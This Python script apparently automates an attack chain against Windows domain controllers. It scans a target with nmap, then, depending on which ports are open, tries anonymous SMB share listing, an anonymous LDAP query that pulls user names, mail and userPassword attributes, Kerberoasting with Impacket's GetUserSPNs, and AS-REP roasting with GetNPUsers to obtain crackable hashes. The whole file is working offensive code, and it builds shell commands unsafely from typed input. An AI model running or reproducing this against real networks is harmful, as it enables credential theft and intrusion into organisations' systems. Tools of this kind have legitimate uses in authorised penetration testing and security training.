import subprocess
from ldap3 import Server, Connection, ALL

# Nmap Scan Function
def run_nmap(ip):
    nmap_command = ["nmap", "-sV", "-p-", "--open", ip]
    result = subprocess.run(nmap_command, capture_output=True, text=True)
    return result.stdout

# SMB Enumeration (Anonymous SMB Check)
def smb_enum(ip):
    smb_command = f"smbclient -L \\\\{ip} -N"
    print(f"Running SMB enumeration (anonymous check): {smb_command}")
    subprocess.run(smb_command, shell=True)

# LDAP Enumeration and Object Class Queries
def ldap_enum(ip, domain):
    server = Server(ip, get_info=ALL)
    conn = Connection(server, user='', password='', auto_bind=False)  # Anonymous connection attempt

    if conn.bind():
        print("[+] Anonymous bind to LDAP successful.")
    else:
        print("[-] Anonymous bind failed, trying authentication...")

    # Example LDAP query to fetch all users
    conn.search(search_base=f'dc={domain},dc=com', search_filter='(objectClass=person)', attributes=['cn', 'userPassword', 'mail'])

    for entry in conn.entries:
        print(entry)

    conn.unbind()

# Kerberoasting using Impacket's GetUserSPNs
def kerberoasting(ip, domain, username, password):
    kerb_command = f"/usr/share/doc/python3-impacket/examples/GetUserSPNs.py {domain}/{username}:{password}@{ip} -request"
    print(f"Running Kerberoasting: {kerb_command}")
    subprocess.run(kerb_command, shell=True)

# AS-REP Roasting using Impacket's GetNPUsers
def asrep_roasting(ip, domain, username):
    asrep_command = f"/usr/share/doc/python3-impacket/examples/GetNPUsers.py {domain}/{username} -no-pass -dc-ip {ip}"
    print(f"Running AS-REP Roasting: {asrep_command}")
    subprocess.run(asrep_command, shell=True)

# Main function that runs the enumeration and exploitation steps based on Nmap results
def main():
    target_ip = input("Enter the target IP: ")
    domain = input("Enter the domain (e.g., example.com): ")

    # Run Nmap scan
    print("Starting Nmap scan...")
    nmap_result = run_nmap(target_ip)
    print(nmap_result)

    # Smart Enumeration and Exploitation Based on Detected Services
    if "445/tcp" in nmap_result:
        print("[+] SMB Detected, running enumeration...")
        smb_enum(target_ip)

    if "389/tcp" in nmap_result or "636/tcp" in nmap_result:
        print("[+] LDAP Detected, running enumeration...")
        ldap_enum(target_ip, domain)

    if "88/tcp" in nmap_result:
        print("[+] Kerberos Detected, attempting Kerberoasting...")
        username = input("Enter username for Kerberoasting: ")
        password = input("Enter password for Kerberoasting: ")
        kerberoasting(target_ip, domain, username, password)

        print("[+] Attempting AS-REP Roasting...")
        asrep_roasting(target_ip, domain, username)

    print("Enumeration and exploitation complete.")

if __name__ == "__main__":
    main()
